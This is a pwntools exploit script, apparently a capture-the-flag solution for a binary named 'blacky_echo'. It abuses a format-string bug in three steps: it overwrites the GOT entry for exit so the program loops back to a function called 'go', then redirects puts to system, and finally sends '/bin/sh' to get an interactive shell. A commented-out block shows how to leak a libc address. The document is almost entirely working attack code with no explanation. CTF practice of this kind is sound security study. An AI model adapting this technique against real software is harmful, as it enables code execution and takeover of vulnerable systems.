from pwn import *

# context.log_level = "debug"
context.binary  = elf = ELF('./blacky_echo')
p = process('./blacky_echo')
# p = remote("challs.m0lecon.it", 9011)
# gdb.attach(p, 'break *0x400B39\nset follow-fork-mode parent')

p.sendlineafter("Size: ", str(0x200001))

offset = cyclic_find("yazr")
# print offset
# fmt_str offset = 10
""" get leaks to find libc version if we want that
p.sendlineafter("Input: ", "A"*offset + "AAA" +  "%11$sAAA" + p64(elf.got['printf']))


p.recvuntil("errAAA")
leak = u64(p.recv(6) + "\x00"*2)
print hex(leak)
"""
data = {
    elf.got['exit']: elf.symbols['go']
}
evil = {
    elf.got['puts']: elf.symbols['system']
}
prefix = "[!] Error: Format errAAA"
# print len(prefix)
payload = fmtstr_payload(10, writes=data, numbwritten=len(prefix), write_size="long")
# print repr(payload)
# print len(payload)
p.sendlineafter("Input: ", "A"*offset + "AAA" + payload)
p.sendlineafter("Size: ", str(0x200001))

payload2 = fmtstr_payload(10, writes=evil, numbwritten=len(prefix), write_size="long")
p.sendlineafter("Input: ", "A"*offset + "AAA" + payload2)

p.sendlineafter("Size: ", str(0x200001))
p.sendlineafter("Input: ", "ECHO->/bin/sh\x00")

p.interactive()
